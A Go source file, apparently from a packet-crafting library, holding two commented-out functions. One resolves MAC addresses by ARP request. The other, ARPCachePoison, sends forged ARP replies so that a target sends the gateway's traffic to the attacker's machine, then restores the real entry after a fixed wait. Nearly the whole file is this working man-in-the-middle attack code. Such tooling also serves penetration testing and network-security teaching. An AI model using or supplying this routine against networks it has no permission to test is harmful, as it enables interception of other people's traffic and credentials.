package higherlevel

/*
func ARPScan(iface string, targetIP string) (string, error) {
	// Get MAC address of interface
	srcMAC, err := utils.GetMACAddress(iface)
	if err != nil {
		return "", err
	}

	// Get IP address of interface
	srcIP, err := utils.ParseIPGen(iface)
	if err != nil {
		return "", err
	}

	// Create a new SuperSocket
	ss, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		return "", err
	}

	// Craft ARP request packet
	arpRequest, err := packet.CraftARPPacket(srcIP, targetIP, srcMAC, "ff:ff:ff:ff:ff:ff", false)
	if err != nil {
		return "", err
	}

	// Send ARP request
	err = ss.Send(arpRequest)
	if err != nil {
		return "", err
	}

	// Read packets
	for {
		pkt, err := ss.Recv()
		if err != nil {
			return "", err
		}

		// Parse the packet
		arpLayer := utils.GetARPLayer(pkt)

		if arpLayer != nil && arpLayer.Operation == layers.ARPReply && net.IP(arpLayer.SourceProtAddress).String() == targetIP {
			return net.HardwareAddr(arpLayer.SourceHwAddress).String(), nil
		}
	}
}

func ARPCachePoison(iface string, targetIP string, gatewayIP string) error {
	// Get MAC address of interface
	srcMAC, err := utils.GetMACAddress(iface)
	if err != nil {
		return err
	}

	// Get the MAC address of the target
	targetMAC, err := ARPScan(iface, targetIP)
	if err != nil {
		return err
	}

	// Get the MAC address of the gateway
	gatewayMAC, err := ARPScan(iface, gatewayIP)
	if err != nil {
		return err
	}

	// Create a new SuperSocket
	ss, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		return err
	}

	// Craft ARP reply packet to poison target's ARP cache
	arpReply, err := packet.CraftARPPacket(gatewayIP, targetIP, srcMAC, targetMAC, true)
	if err != nil {
		return err
	}

	// Send the ARP reply to the target
	err = ss.Send(arpReply)
	if err != nil {
		return err
	}

	// Wait for some time (e.g. 10 seconds). This duration depends on the duration of your attack.
	time.Sleep(10 * time.Second)

	// Craft ARP reply packet with the legitimate MAC of the gateway to restore the original ARP entry
	arpReplyLegit, err := packet.CraftARPPacket(gatewayIP, targetIP, gatewayMAC, targetMAC, true)
	if err != nil {
		return err
	}

	// Send the legitimate ARP reply to the target
	err = ss.Send(arpReplyLegit)
	if err != nil {
		return err
	}

	return nil
}


*/
